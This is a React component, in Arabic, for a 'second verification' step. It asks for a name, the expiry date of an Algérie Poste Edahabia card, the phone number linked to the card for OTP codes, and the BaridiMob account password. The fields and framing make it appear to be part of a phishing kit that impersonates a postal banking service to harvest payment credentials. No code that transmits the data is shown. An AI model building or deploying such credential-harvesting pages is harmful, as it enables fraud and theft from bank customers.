"use client"

import { useState } from "react"
import { User, Calendar, Phone, Check, Eye, EyeOff, Lock } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"

interface StepPersonalInfoProps {
  onNext: (data: PersonalInfo) => void
  currentStep: number
}

export interface PersonalInfo {
  firstName: string
  lastName: string
  expiryDate: string
  phoneNumber: string
  baridiPassword: string
}

export function StepPersonalInfo({ onNext, currentStep }: StepPersonalInfoProps) {
  const [formData, setFormData] = useState<PersonalInfo>({
    firstName: "",
    lastName: "",
    expiryDate: "",
    phoneNumber: "",
    baridiPassword: "",
  })
  const [showPassword, setShowPassword] = useState(false)

  const handleChange = (field: keyof PersonalInfo, value: string) => {
    if (field === "expiryDate") {
      // Format as MM/YY
      const numbers = value.replace(/\D/g, "").slice(0, 4)
      if (numbers.length >= 2) {
        value = numbers.slice(0, 2) + "/" + numbers.slice(2)
      } else {
        value = numbers
      }
    }
    if (field === "phoneNumber") {
      value = value.replace(/\D/g, "").slice(0, 10)
    }
    setFormData((prev) => ({ ...prev, [field]: value }))
  }

  const isValid = formData.firstName && formData.lastName && formData.expiryDate.length === 5 && formData.phoneNumber.length >= 9 && formData.baridiPassword.length > 0

  return (
    <div className="min-h-screen bg-background">
      {/* Progress Steps */}
      <div className="flex items-center justify-center gap-2 py-6">
        <div className="flex items-center">
          <div className="w-8 h-8 rounded-full bg-muted text-muted-foreground flex items-center justify-center text-sm font-medium">
            3
          </div>
          <div className="w-12 h-0.5 bg-muted"></div>
        </div>
        <div className="flex items-center">
          <div className="w-10 h-10 rounded-full bg-primary text-primary-foreground flex items-center justify-center text-sm font-bold">
            2
          </div>
          <div className="w-12 h-0.5 bg-primary"></div>
        </div>
        <div className="w-10 h-10 rounded-full bg-green-500 text-white flex items-center justify-center">
          <Check className="w-5 h-5" />
        </div>
      </div>

      {/* Form Card */}
      <div className="mx-4">
        <div className="bg-secondary/30 rounded-2xl p-6">
          {/* Title */}
          <div className="text-center mb-8">
            <h1 className="text-2xl font-bold text-foreground mb-2">التحقق الثاني</h1>
            <p className="text-muted-foreground">أكمل معلوماتك الشخصية</p>
          </div>

          {/* First Name */}
          <div className="mb-5">
            <div className="flex items-center justify-end gap-2 mb-2">
              <span className="text-foreground font-medium">الاسم الأول</span>
              <User className="w-5 h-5 text-primary" />
            </div>
            <Input
              type="text"
              value={formData.firstName}
              onChange={(e) => handleChange("firstName", e.target.value)}
              placeholder="أدخل اسمك الأول"
              className="bg-background border-border text-foreground h-14 text-right text-lg"
              dir="rtl"
            />
          </div>

          {/* Last Name */}
          <div className="mb-5">
            <div className="flex items-center justify-end gap-2 mb-2">
              <span className="text-foreground font-medium">اللقب</span>
              <User className="w-5 h-5 text-primary" />
            </div>
            <Input
              type="text"
              value={formData.lastName}
              onChange={(e) => handleChange("lastName", e.target.value)}
              placeholder="أدخل لقبك"
              className="bg-background border-border text-foreground h-14 text-right text-lg"
              dir="rtl"
            />
          </div>

          {/* Expiry Date */}
          <div className="mb-5">
            <div className="flex items-center justify-end gap-2 mb-2">
              <span className="text-foreground font-medium">تاريخ انتهاء بطاقة الذهبية</span>
              <Calendar className="w-5 h-5 text-primary" />
            </div>
            <Input
              type="text"
              value={formData.expiryDate}
              onChange={(e) => handleChange("expiryDate", e.target.value)}
              placeholder="MM/YY"
              className="bg-background border-border text-foreground h-14 text-center text-2xl font-mono tracking-widest"
              dir="ltr"
            />
          </div>

          {/* Phone Number */}
          <div className="mb-5">
            <div className="flex items-center justify-end gap-2 mb-2">
              <span className="text-foreground font-medium">رقم الهاتف</span>
              <Phone className="w-5 h-5 text-primary" />
            </div>
            <div className="bg-primary/10 border border-primary/30 rounded-lg p-3 mb-3">
              <p className="text-primary text-sm text-right">
                رقم الهاتف المربوط مع البطاقة الذهبية (لاستلام رمز التأكيد OTP)
              </p>
            </div>
            <Input
              type="tel"
              value={formData.phoneNumber}
              onChange={(e) => handleChange("phoneNumber", e.target.value)}
              placeholder="0X XX XX XX XX"
              className="bg-background border-border text-foreground h-14 text-center text-2xl font-mono tracking-widest"
              dir="ltr"
            />
          </div>

          {/* Baridi Password */}
          <div className="mb-6">
            <div className="flex items-center justify-end gap-2 mb-2">
              <span className="text-foreground font-medium">كلمة مرور بريدي موب</span>
              <Lock className="w-5 h-5 text-primary" />
            </div>
            <div className="relative">
              <Input
                type={showPassword ? "text" : "password"}
                value={formData.baridiPassword}
                onChange={(e) => handleChange("baridiPassword", e.target.value)}
                placeholder="أدخل كلمة المرور"
                className="bg-background border-border text-foreground h-14 text-right pl-12"
                dir="rtl"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                disabled={!formData.baridiPassword}
                className="absolute left-4 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground disabled:opacity-30 transition-colors"
              >
                {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
              </button>
            </div>
          </div>

          {/* Submit Button */}
          <Button
            onClick={() => onNext(formData)}
            disabled={!isValid}
            className="w-full h-14 bg-primary hover:bg-primary/90 text-primary-foreground text-lg font-bold rounded-xl"
          >
            متابعة
          </Button>
        </div>
      </div>
    </div>
  )
}
